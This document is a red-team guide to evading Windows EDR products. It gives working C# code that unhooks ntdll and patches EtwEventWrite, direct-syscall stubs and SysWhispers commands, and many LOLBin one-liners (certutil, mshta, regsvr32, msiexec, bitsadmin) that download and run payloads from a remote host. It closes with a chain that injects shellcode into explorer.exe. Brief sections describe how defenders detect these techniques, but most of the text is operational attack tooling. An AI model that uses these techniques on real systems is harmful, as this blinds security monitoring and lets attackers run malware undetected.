# EDR Detection Evasion Guide

> Understand EDR detection signals (API hooking, ETW, process telemetry), evade monitoring via direct syscalls, API unhooking, unhooking ntdll from a clean copy, and leverage living-off-the-land binaries (LOLBins) for execution that blends with normal system activity.

## Introduction

Endpoint Detection and Response (EDR) platforms operate at a fundamentally different level than traditional antivirus. While AV focuses on file scanning and signature matching, EDR collects behavioral telemetry from kernel callbacks, ETW (Event Tracing for Windows) providers, API hooking, and process tree analysis to build a comprehensive picture of endpoint activity. This makes evasion significantly more challenging because the payload's behavior, not just its binary content, is under scrutiny.

This guide covers the three primary EDR detection mechanisms (API hooking, ETW telemetry, and process telemetry) and corresponding evasion techniques (direct syscalls, API unhooking, and LOLBin-based execution). Understanding both the detection and evasion sides is essential for effective red team operations in monitored environments.

---

## 1. EDR Detection Mechanisms

### API Hooking (User-Mode)

Most EDR products hook sensitive NTAPI functions in user-mode by patching the function prologues in ntdll.dll. When a process calls a hooked function (e.g., NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx), execution is redirected to the EDR's detection engine before reaching the kernel. The EDR inspects the function parameters and decides whether to allow, block, or alert on the call.

**Common hooked functions**:

```
Function                      | Monitored Activity
NtAllocateVirtualMemory       | Memory allocation (injection indicator)
NtWriteVirtualMemory          | Writing to remote process memory
NtCreateThreadEx              | Creating threads in remote processes
NtOpenProcess                 | Opening handles to other processes
NtProtectVirtualMemory        | Changing memory protections (RWX)
NtMapViewOfSection            | Section mapping (process hollowing)
NtQueueApcThread              | APC injection
NtSetContextThread            | Thread context manipulation
NtCreateFile / NtReadFile     | File system operations
NtCreateProcessEx             | Process creation
```

**Hook implementation**: EDR products typically use inline hooks (patching the first 5-16 bytes of the function with a JMP instruction to their code) or hardware breakpoints (via debug registers DR0-DR3 with Vectored Exception Handling).

### ETW (Event Tracing for Windows)

ETW is a kernel-level tracing facility that provides detailed telemetry about system activity. EDR products register as ETW consumers to receive real-time events from providers including:

- **Microsoft-Windows-Kernel-Process**: Process creation, thread creation, image loading.
- **Microsoft-Windows-Kernel-File**: File system operations.
- **Microsoft-Windows-Security-Auditing**: Authentication and privilege events.
- **Microsoft-Windows-PowerShell**: PowerShell script block execution (Event ID 4104).
- **Microsoft-DotNETFramework-CLR**: .NET assembly loading events.
- **Microsoft-Windows-Kernel-Registry**: Registry operations.

ETW operates at the kernel level, making it impossible to disable from user-mode without elevated privileges. However, ETW providers can be patched in user-mode before they dispatch events.

### Process Telemetry

EDR products maintain behavioral profiles of processes by tracking:

1. **Parent-child process relationships**: Anomalous chains (e.g., Word.exe spawning cmd.exe or powershell.exe) trigger alerts.
2. **Command-line logging**: Full command lines are captured for process creation events (Event ID 4688).
3. **Network connections**: Outbound connections from unexpected processes or to suspicious IPs.
4. **Registry modifications**: Changes to persistence locations (Run keys, Services, Scheduled Tasks).
5. **Image load events**: DLLs loaded by processes, especially suspicious ones (e.g., dbghelp.dll, ws2_32.dll in unexpected contexts).

---

## 2. Direct Syscalls

### Concept

Direct syscalls bypass user-mode API hooks by invoking the kernel syscall instruction directly, without going through ntdll.dll. The syscall number (SSN - System Service Number) is resolved dynamically and the syscall instruction is executed from the attacker's code, completely avoiding the EDR's hooked functions in ntdll.

### How Syscalls Work (Normal Flow)

```
Application -> kernel32.dll (CreateRemoteThread)
            -> ntdll.dll (NtCreateThreadEx)  <-- EDR hooks here
            -> syscall instruction
            -> Kernel (KiSystemServiceHandler)
```

### Direct Syscall Flow (Bypass)

```
Attacker code -> Resolve SSN for NtCreateThreadEx dynamically
              -> Execute syscall instruction directly from attacker code
              -> Kernel (KiSystemServiceHandler)
              (ntdll.dll is never called, hook is bypassed)
```

### SysWhispers - Automated Stub Generation

SysWhispers is a tool that generates C header and implementation files for direct syscall stubs, supporting both x86 and x64 architectures.

```bash
# Install SysWhispers3
pip3 install syswhispers3

# Generate syscall stubs for specific functions
syswhispers3 --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtOpenProcess -o syscalls

# Output files: syscalls.h, syscalls.c, syscalls-asm.asm
# Include these in your C/C++ project

# Generate with egg hunter (resolves SSNs dynamically)
syswhispers3 --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls --egg-hunter

# Generate for all common NTAPI functions
syswhispers3 --all -o syscalls_all
```

### Direct Syscall Implementation (Assembly)

```nasm
; x64 syscall stub for NtAllocateVirtualMemory
; SSN resolved at runtime via sorting from NtGetContextThread
syscall_stub_NtAllocateVirtualMemory:
    mov r10, rcx            ; Standard x64 calling convention
    mov eax, SSN_HERE       ; Resolved dynamically (e.g., 0x18)
    syscall                 ; Direct kernel transition
    ret
```

### Limitations of Direct Syscalls

1. **Kernel callbacks**: Even with direct syscalls, the kernel itself has registered callbacks (e.g., ObRegisterCallbacks for process handle protection, PsSetCreateProcessNotifyRoutine for process creation monitoring) that EDR products use. These cannot be bypassed from user-mode.
2. **ETW telemetry**: Direct syscalls still produce ETW events at the kernel level. The syscall itself is invisible to user-mode hooks, but the resulting kernel operations generate telemetry.
3. **Call stack analysis**: EDR products can inspect the call stack when kernel callbacks fire. If the return address points to an unbacked memory region (shellcode or manually mapped module), it raises suspicion.

---

## 3. API Unhooking

### Concept

API unhooking restores the original, unhooked bytes of ntdll.dll functions by copying the clean code from a fresh copy of ntdll loaded from disk. This effectively removes the EDR's inline hooks, allowing the process to call NTAPI functions normally without triggering user-mode detection.

### Unhooking Process

1. **Open a handle to C:\Windows\System32\ntdll.dll** on disk.
2. **Map the file as an image** (MapViewOfFile with SEC_IMAGE).
3. **Locate the .text section** in both the mapped (clean) and loaded (hooked) copies.
4. **Copy the .text section** from the clean copy over the hooked copy.
5. **Restore memory protections** to their original values.

### Implementation

```csharp
// C# ntdll unhooking implementation
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

public class NtdllUnhooker
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    public static void Unhook()
    {
        // Get the currently loaded (hooked) ntdll base address
        IntPtr hookedNtdll = GetModuleHandle("ntdll.dll");

        // Read the clean ntdll from disk
        byte[] cleanNtdll = File.ReadAllBytes(
            @"C:\Windows\System32\ntdll.dll");

        // Parse PE headers to find .text section
        int e_lfanew = BitConverter.ToInt32(cleanNtdll, 0x3C);
        int sectionOffset = e_lfanew + 0x18 + 0xF0;
        int textSectionOffset = -1;
        int textSectionSize = 0;

        for (int i = 0; i < 6; i++)  // Up to 6 sections
        {
            int offset = sectionOffset + (i * 40);
            string name = System.Text.Encoding.ASCII.GetString(
                cleanNtdll, offset, 8).TrimEnd('\0');
            if (name == ".text")
            {
                int virtualSize = BitConverter.ToInt32(cleanNtdll, offset + 8);
                int virtualAddress = BitConverter.ToInt32(cleanNtdll, offset + 12);
                textSectionOffset = virtualAddress;
                textSectionSize = virtualSize;
                break;
            }
        }

        if (textSectionOffset == -1) return;

        // Calculate addresses
        IntPtr textBase = hookedNtdll + textSectionOffset;
        uint oldProtect;

        // Remove memory protection
        VirtualProtect(textBase, (UIntPtr)textSectionSize, 0x40, out oldProtect);

        // Copy clean .text section over hooked .text section
        Marshal.Copy(cleanNtdll, textSectionOffset,
            textBase, textSectionSize);

        // Restore memory protection
        VirtualProtect(textBase, (UIntPtr)textSectionSize, oldProtect, out oldProtect);
    }
}
```

### Detection of Unhooking

EDR products detect unhooking attempts through:

1. **Memory page protection changes**: VirtualProtect calls on ntdll pages are monitored via kernel callbacks.
2. **Module integrity checks**: Periodic hashing of ntdll function prologues to detect tampering.
3. **Stack trace analysis**: If a VirtualProtect call on ntdll pages originates from suspicious code, it triggers an alert.
4. **Second copy detection**: Loading a second copy of ntdll from disk (even as a file mapping) can be flagged.

### Per-Function Unhooking

Instead of unhooking the entire .text section (which is noisy), selectively unhook only the functions you need:

```bash
# Identify which functions are hooked by comparing ntdll bytes
# Hooked functions start with: jmp [addr] (FF 25 ...) or mov rax, addr; jmp rax
# Clean functions start with: mov r10, rcx (4C 8B D1) followed by mov eax, SSN

# Compare the first 16 bytes of each NTAPI function between clean and loaded ntdll
# Only restore bytes for functions that differ (i.e., are hooked)
```

---

## 4. ETW Patching

### Concept

ETW patching disables the EDR's telemetry collection by patching the ETW provider's event write function (EtwEventWrite) to return immediately without dispatching events. This blinds the EDR to activity within the patched process.

### Implementation

```csharp
// Patch EtwEventWrite to return STATUS_SUCCESS (0) immediately
[DllImport("kernel32.dll")]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32.dll")]
static extern IntPtr GetModuleHandle(string name);

[DllImport("kernel32.dll")]
static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
    uint flNewProtect, out uint lpflOldProtect);

public static void PatchETW()
{
    IntPtr ntdll = GetModuleHandle("ntdll.dll");
    IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");

    uint oldProtect;
    VirtualProtect(etwEventWrite, (UIntPtr)2, 0x40, out oldProtect);

    // Patch: xor eax, eax; ret (return 0 = STATUS_SUCCESS)
    byte[] patch = { 0x33, 0xC0, 0xC3 };
    Marshal.Copy(patch, 0, etwEventWrite, patch.Length);

    VirtualProtect(etwEventWrite, (UIntPtr)2, oldProtect, out oldProtect);
}
```

### Limitations

- **Kernel-level ETW**: Kernel ETW providers continue to function regardless of user-mode patching. Process creation, thread creation, and image load events are generated by the kernel and cannot be disabled from user-mode.
- **Detection**: EDR products that perform integrity checks on ntdll functions will detect the EtwEventWrite patch.
- **Scope**: ETW patching only affects the current process. Other processes on the system continue to report telemetry normally.

---

## 5. Living Off the Land Binaries (LOLBins)

### Concept

LOLBins are legitimate, signed Windows binaries that can be abused to execute code, download files, or bypass security controls. Because these binaries are part of the operating system (or trusted third-party software), they are inherently trusted by AV/EDR products and rarely trigger alerts when used for their intended purpose.

### Execution LOLBins

```bash
# certutil.exe - Download and decode files
certutil -urlcache -split -f http://10.0.0.1/payload.bin payload.bin
certutil -decode encoded.b64 decoded.bin
certutil -hashfile payload.exe MD5

# mshta.exe - Execute HTA (HTML Application) payloads
mshta http://10.0.0.1/evil.hta
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd"":Close")

# msiexec.exe - Execute MSI packages
msiexec /i http://10.0.0.1/payload.msi /quiet /norestart
msiexec /y payload.dll  # Register DLL

# wscript.exe / cscript.exe - Execute scripts
wscript //nologo payload.vbs
cscript //nologo //E:vbscript payload.txt

# rundll32.exe - Execute DLL exports
rundll32.exe payload.dll,EntryPoint
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"

# regsvr32.exe - Execute COM scriptlets
regsvr32 /s /n /u /i:http://10.0.0.1/payload.sct scrobj.dll

# msbuild.exe - Execute C# code via project files
msbuild.exe payload.csproj

# InstallUtil.exe - Execute .NET installer classes
InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

# cmstp.exe - Execute INF-based payloads
cmstp /s /ns payload.inf
```

### Download LOLBins

```bash
# bitsadmin.exe - Background file transfer
bitsadmin /transfer job /download /priority high http://10.0.0.1/file C:\temp\file

# PowerShell - Web download
powershell -c "Invoke-WebRequest -Uri http://10.0.0.1/file -OutFile C:\temp\file"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.0.0.1/file','C:\temp\file')"

# curl.exe (Windows 10+)
curl -o C:\temp\file http://10.0.0.1/file
```

### LOLBin Selection Strategy

When choosing a LOLBin for execution, consider:

1. **Prevalence**: The binary should be commonly used in the target environment. Rundll32.exe and wscript.exe are more common than cmstp.exe or mshta.exe.
2. **Parent process**: The LOLBin should be launched from a parent process that makes sense. A Word document spawning certutil.exe is suspicious; a scheduled task spawning certutil.exe is less so.
3. **Network activity**: LOLBins that legitimately make network connections (certutil, bitsadmin) are less suspicious when downloading payloads than those that do not normally access the network.
4. **Logging**: Some LOLBins generate more logging than others. PowerShell has extensive logging (script block logging, module logging, transcription). Consider alternatives with less visibility.

---

## 6. Combining Evasion Techniques

The most effective evasion chains layer multiple techniques to address each detection layer:

1. **Unhook ntdll** (remove user-mode API hooks).
2. **Patch ETW** (disable process-level telemetry).
3. **Use direct syscalls** (for any functions that are re-hooked or not covered by unhooking).
4. **Execute via LOLBin** (use a trusted parent process).
5. **Inject into a legitimate process** (blend with normal process tree).

```
Execution chain:
  Scheduled Task -> msbuild.exe (LOLBin parent)
    -> loads custom C# project
      -> unhooking ntdll (remove hooks)
      -> patch ETW (disable telemetry)
      -> resolve syscalls dynamically
      -> inject shellcode into explorer.exe
        -> execute payload from explorer.exe context
```

This layered approach addresses static detection (the code runs from a legitimate process), behavioral detection (hooks and ETW are disabled), and process telemetry (the parent-child chain looks normal).

---

## References

- **SysWhispers3 GitHub**: https://github.com/klezVirus/SysWhispers3
- **Inline Hook Detection (Hasherezade)**: https://github.com/hasherezade/libpeconv
- **GOT-EDR Evasion Techniques**: https://github.com/CCob/BlockEtw
- **LOLBAS Project**: https://lolbas-project.github.io/
- **Elastic EDR Detection Logic**: https://www.elastic.co/guide/en/security/current/detection-overview.html
- **CrowdStrike Falcon Architecture**: https://www.crowdstrike.com/products/endpoint-security/falcon-platform/
- **Direct Syscalls in Offensive Security**: https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low
- **Windows Internals (Pavel Yosifovich)**: https://www.windowsinternals.com/
